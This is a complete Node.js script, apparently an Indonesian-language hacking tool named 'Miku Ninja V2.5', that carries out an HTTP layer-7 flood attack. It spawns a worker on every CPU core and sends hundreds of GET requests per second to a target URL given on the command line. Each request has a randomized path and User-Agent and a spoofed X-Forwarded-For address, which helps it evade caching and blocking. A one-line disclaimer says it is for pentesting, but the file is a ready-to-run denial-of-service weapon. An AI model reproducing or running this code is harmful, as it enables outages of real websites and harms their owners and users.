// ⚠️ MIKU NINJA V2.5 — ADVANCED L7 FLOOD ⚠️
// Gunakan hanya untuk pentest. Jangan abuse.

const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const rate = parseInt(process.argv[4]) || 200; // req/s per thread
const cores = os.cpus().length;

if (!target) {
  console.log("❌ Target URL dibutuhkan.\nContoh: node miku_ninja_v2.5.js https://target.com 60 300");
  process.exit(1);
}

function randIp() {
  return Array(4).fill().map(() => Math.floor(Math.random() * 255)).join('.');
}

function randStr(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return [...Array(length)].map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function randomPath() {
  return '/' + randStr(Math.floor(Math.random() * 10 + 5)) +
         '?' + randStr(5) + '=' + randStr(8);
}

function randomHeaders(host) {
  return {
    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 100)}.0.${randStr(3)}.0 Safari/${randStr(4)}`,
    'X-Forwarded-For': randIp(),
    'Referer': `https://${host}/${randStr(5)}`,
    'Origin': `https://${host}`,
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Connection': 'Keep-Alive',
    'Pragma': 'no-cache',
    'Accept': '*/*'
  };
}

function attackThread() {
  const parsed = new URL(target);
  const lib = parsed.protocol === 'https:' ? https : http;

  const flood = () => {
    const options = {
      method: 'GET',
      host: parsed.hostname,
      path: parsed.pathname + randomPath(),
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      headers: randomHeaders(parsed.hostname),
      agent: false,
      timeout: 5000,
    };

    const req = lib.request(options, () => {});
    req.on('error', () => {});
    req.end();
  };

  setInterval(() => {
    for (let i = 0; i < rate; i++) flood();
  }, 1000); // Jalankan `rate` request per detik per thread
}

if (cluster.isPrimary) {
  console.log(`🚀 Menyerang ${target} selama ${duration}s @${rate}req/s * ${cores} core`);

  for (let i = 0; i < cores; i++) cluster.fork();

  setTimeout(() => {
    console.log('✅ Serangan selesai. Bot berhenti.');
    process.exit(0);
  }, duration * 1000);
} else {
  attackThread();
}